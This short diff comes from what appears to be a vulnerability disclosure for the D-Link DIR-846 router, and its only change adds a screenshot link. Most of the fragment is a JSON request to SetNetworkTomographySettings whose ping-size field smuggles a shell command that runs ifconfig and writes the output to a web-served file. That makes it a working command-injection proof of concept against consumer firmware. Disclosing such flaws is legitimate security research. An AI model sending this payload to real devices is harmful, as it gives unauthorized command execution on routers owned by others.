@@ -50,4 +50,4 @@ Connection: close
 
 {"SetNetworkTomographySettings":{"tomography_ping_address":"192.168.0.2","tomography_ping_number":"2","tomography_ping_size":"4 127.0.0.1&&ifconfig>/www/b.txt&&ping -c 1 ","tomography_ping_timeout":"","tomography_ping_ttl":""}}
 ```
-
+![20191113104711.png](https://github.com/Cyc1eC/D-Link/blob/master/DIR-846/20191113104711.png)
